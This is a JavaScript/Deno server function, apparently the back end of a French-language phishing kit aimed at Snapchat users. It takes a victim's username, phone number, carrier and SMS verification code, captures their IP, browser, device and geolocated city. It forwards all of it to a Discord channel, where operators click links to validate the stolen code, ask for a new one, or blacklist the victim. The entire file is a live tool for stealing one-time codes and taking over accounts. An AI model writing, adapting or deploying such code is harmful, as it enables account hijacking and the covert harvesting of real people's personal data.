import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { snapchat, telephone, operateur, code, submissionId } = await req.json();

    const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();

    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
    const userAgent = req.headers.get("user-agent") || "";

    let browser = "Inconnu";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Edge")) browser = "Edge";

    let device = "💻 PC";
    if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
    else if (userAgent.includes("iPad")) device = "📱 Tablette";

    const now = new Date();
    const dateStr = now.toLocaleDateString("fr-FR", {
      weekday: "long", day: "numeric", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
    const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";

    let country = "Inconnue";
    let city = "Inconnue";
    try {
      const geoRes = await base44.functions.invoke("geolocateIP", { ip });
      if (geoRes?.data) {
        country = geoRes.data.country || "Inconnue";
        city = geoRes.data.city || "Inconnue";
      }
    } catch (e) {
      console.error("geolocateIP failed:", e.message);
    }

    const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
    const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
    const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
    const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
    const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;

    const channelId = Deno.env.get("DISCORD_CHANNEL_ID");
    await botAPI(`/channels/${channelId}/messages`, "POST", {
      content: "@everyone",
      embeds: [{
        title: "🔑 Code SMS entré",
        color: operatorColors[operateur] || 16776960,
        fields: [
          { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
          { name: "📡 Opérateur", value: operateur, inline: true },
          { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
          { name: "🔢 Code entré", value: `**${code}**`, inline: true },
          { name: "🌍 Pays", value: country, inline: true },
          { name: "🏙️ Ville", value: city, inline: true },
          { name: "🌐 Navigateur", value: browser, inline: true },
          { name: "💾 Appareil", value: device, inline: true },
          { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
          { name: "🕐 Date", value: dateStr, inline: false },
          {
            name: "⚡ Actions",
            value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
            inline: false
          },
        ],
        footer: { text: `ID: ${submissionId || "N/A"}` },
        timestamp: now.toISOString(),
      }]
    });

    return Response.json({ ok: true });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});